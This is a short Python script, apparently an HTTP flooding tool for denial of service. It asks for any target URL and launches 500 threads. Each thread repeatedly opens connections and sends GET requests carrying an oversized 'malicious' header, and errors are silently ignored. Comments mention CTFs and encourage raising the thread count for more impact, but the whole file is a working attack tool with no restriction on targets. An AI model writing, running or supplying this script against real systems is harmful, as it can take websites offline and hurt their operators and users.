import socket
import threading
import time
import ssl
from urllib.parse import urlparse

# Increase these for more impact (but be careful!)
THREADS = 500  # Number of concurrent threads
DELAY = 0.01   # Delay between requests (seconds)

def attack(target, port, path, use_ssl):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)

            if use_ssl:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=target)

            s.connect((target, port))

            # Craft malicious request - try different variations for CTFs
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                "User-Agent: Mozilla/5.0 (CTF Attack)\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n"
                f"X-Malicious-Header: {'A' * 1000}\r\n\r\n"  # Large header
            )

            s.send(payload.encode())
            time.sleep(DELAY)  # Keep connection open
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def main():
    url = input("Enter target URL (http/https): ").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    parsed = urlparse(url)
    target = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path if parsed.path else '/'
    use_ssl = parsed.scheme == 'https'

    print(f"Attacking {target}:{port}{path} with {THREADS} threads...")
    print("Press Ctrl+C to stop")

    for i in range(THREADS):
        t = threading.Thread(target=attack, args=(target, port, path, use_ssl))
        t.daemon = True
        t.start()

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped")

if __name__ == "__main__":
    main()
